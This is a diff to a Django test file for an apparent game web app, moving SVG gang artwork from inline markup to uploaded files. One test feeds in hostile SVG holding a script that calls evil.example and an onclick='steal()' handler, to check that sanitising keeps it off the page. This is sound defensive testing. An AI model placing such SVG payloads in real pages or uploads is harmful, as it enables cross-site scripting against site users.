@@ -16,8 +16,8 @@ from n26.library.models import GangType
 
 pytestmark = pytest.mark.django_db
 
-#: Stand-in artwork, in the shape an author pastes into the library: one <svg>
-#: drawn in a single colour. The path is distinctive so a test can look for it.
+#: Stand-in artwork, the shape of a file an author uploads: one <svg> drawn in
+#: a single colour. The path is distinctive so a test can look for it.
 ICON = (
     '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 12">'
     '<path d="M2 2h8v8H2Z"/></svg>'
@@ -50,17 +50,22 @@ def tester(db):
 
 @pytest.fixture(autouse=True)
 def clean_artwork_cache():
-    """Cleaned artwork is cached against a hash of the markup, and the
-    cache outlives a test. Two tests using the same drawing would
-    otherwise share an entry and the second would prove nothing."""
+    """Artwork is cached twice over — the source against the object it
+    was read from, the cleaned markup against a hash of that source —
+    and the cache outlives a test. Two tests using the same drawing
+    would otherwise share an entry and the second would prove nothing."""
     cache.clear()
     yield
     cache.clear()
 
 
 @pytest.fixture
-def drawn(db):
-    return GangType.objects.create(name="Goliath", icon=ICON, starting_credits=1000)
+def drawn(db, store_artwork):
+    return GangType.objects.create(
+        name="Goliath",
+        icon_url=store_artwork(ICON, "goliath.svg"),
+        starting_credits=1000,
+    )
 
 
 @pytest.fixture
@@ -169,14 +174,17 @@ class TestTheBadgeOnTheGrid:
         body = client.get(reverse("n26-create-gang")).content.decode()
         assert body.count(_FLAIR_WRAPPER) == 1
 
-    def test_hostile_artwork_never_reaches_the_page(self, client, tester):
-        """Artwork is markup an author typed and a database handed back.
+    def test_hostile_artwork_never_reaches_the_page(
+        self, client, tester, store_artwork
+    ):
+        """Artwork is a file an author uploaded and storage handed back.
         It is cleaned where it is drawn, so a page cannot forget to."""
         GangType.objects.create(
             name="Trouble",
-            icon=(
+            icon_url=store_artwork(
                 '<svg viewBox="0 0 8 8"><script>fetch("//evil.example")</script>'
-                '<path d="M0 0" onclick="steal()"/></svg>'
+                '<path d="M0 0" onclick="steal()"/></svg>',
+                "trouble.svg",
             ),
         )
         client.force_login(tester)
